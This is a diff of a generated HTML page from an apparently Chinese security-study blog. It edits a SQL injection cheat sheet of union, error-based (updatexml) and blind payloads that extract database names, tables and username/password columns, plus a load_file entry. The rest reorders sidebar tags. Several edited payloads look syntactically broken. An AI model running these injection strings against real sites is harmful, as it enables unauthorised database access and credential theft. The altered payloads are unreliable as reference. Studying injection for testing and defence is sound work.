@@ -45,7 +45,7 @@
         content="2021-08-05">
       <meta 
         property="og:article:modified_time" 
-        content="2021-08-23">
+        content="2021-08-29">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -428,7 +428,7 @@
 </tr>
 <tr>
 <td align="left">查数据</td>
-<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)-- a</code></td>
+<td align="left"><code>-1 union select 1,2,(select concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)-- a</code></td>
 </tr>
 </tbody></table>
 <p><strong>注意</strong>：</p>
@@ -555,19 +555,19 @@
 </thead>
 <tbody><tr>
 <td align="left">查数据库名</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- a</code> 推荐 <br>或 <br><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)-- a</code></td>
+<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select database()),0x7e),1)-- a</code> 推荐 <br>或 <br><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)-- a</code></td>
 </tr>
 <tr>
 <td align="left">查表名</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#39;数据库&#39;),0x7e),1)-- a</code></td>
+<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#39;数据库&#39;),0x7e),1)-- a</code></td>
 </tr>
 <tr>
 <td align="left">查列名</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;),0x7e),1)-- a</code></td>
+<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;),0x7e),1)-- a</code></td>
 </tr>
 <tr>
 <td align="left">查数据</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(username,0x7e,password),1,30) from &#39;数据库名&#39;.&#39;表名&#39;),0x7e),1)-- a</code></td>
+<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(concat(username,0x7e,password),1,30) from &#39;数据库名&#39;.&#39;表名&#39;),0x7e),1)-- a</code></td>
 </tr>
 </tbody></table>
 <h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>条件匹配时返回数据，不匹配时无显示。需要对数据进行猜解（用ascii码进行匹配）</p>
@@ -628,7 +628,7 @@
 </tr>
 <tr>
 <td align="left">获取数据</td>
-<td align="left"><code>and ascii((select mid((username,password),1,1) from database().&#39;表名&#39;))=30 -- a</code></td>
+<td align="left"><code>and ascii((select mid(concat(username,0x7e,password),1,1) from database().&#39;表名&#39;))=30 -- a</code></td>
 </tr>
 </tbody></table>
 <h3 id="时间延时盲注"><a href="#时间延时盲注" class="headerlink" title="时间延时盲注"></a>时间延时盲注</h3><p>（单双引号页面无变化）</p>
@@ -695,7 +695,7 @@
 </tr>
 <tr>
 <td align="left">获取字段名</td>
-<td align="left"><code>and if((ascii((select mid(goup_concat(username),1,1) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
+<td align="left"><code>and if((ascii((select mid(concat(username),1,1) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
 </tr>
 </tbody></table>
 <p>注： sleep可用benchmark代替</p>
@@ -855,7 +855,7 @@
 </thead>
 <tbody><tr>
 <td>读文件</td>
-<td>load_file</td>
+<td>load_file(‘’)</td>
 </tr>
 <tr>
 <td>写文件</td>
@@ -1036,13 +1036,6 @@
         </div>
       </a>
     
-      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-        <div class="categories-list-item">
-          漏洞复现
-          <span class="categories-list-item-badge">5</span>
-        </div>
-      </a>
-    
       <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
         <div class="categories-list-item">
           编程基础
@@ -1054,6 +1047,13 @@
         <div class="categories-list-item">
           网络基础
           <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">5</span>
         </div>
       </a>
     
@@ -1139,15 +1139,15 @@
       </a>
     
       <a 
-        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
-        title="逻辑漏洞">
-        <div class="tags-list-item">逻辑漏洞</div>
-      </a>
-    
-      <a 
         href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
         title="网络协议">
         <div class="tags-list-item">网络协议</div>
+      </a>
+    
+      <a 
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
       </a>
     
       <a 
@@ -1169,18 +1169,6 @@
       </a>
     
       <a 
-        href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/" 
-        title="综合靶场">
-        <div class="tags-list-item">综合靶场</div>
-      </a>
-    
-      <a 
-        href="/tags/%E5%8D%9A%E5%AE%A2/" 
-        title="博客">
-        <div class="tags-list-item">博客</div>
-      </a>
-    
-      <a 
         href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
         title="直播推流">
         <div class="tags-list-item">直播推流</div>
@@ -1193,9 +1181,15 @@
       </a>
     
       <a 
-        href="/tags/Apache/" 
-        title="Apache">
-        <div class="tags-list-item">Apache</div>
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/" 
+        title="综合靶场">
+        <div class="tags-list-item">综合靶场</div>
       </a>
     
       <a 
@@ -1205,15 +1199,21 @@
       </a>
     
       <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
         href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
         title="反弹shell">
         <div class="tags-list-item">反弹shell</div>
       </a>
     
       <a 
-        href="/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" 
-        title="入侵排查">
-        <div class="tags-list-item">入侵排查</div>
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
       </a>
     
   </div>
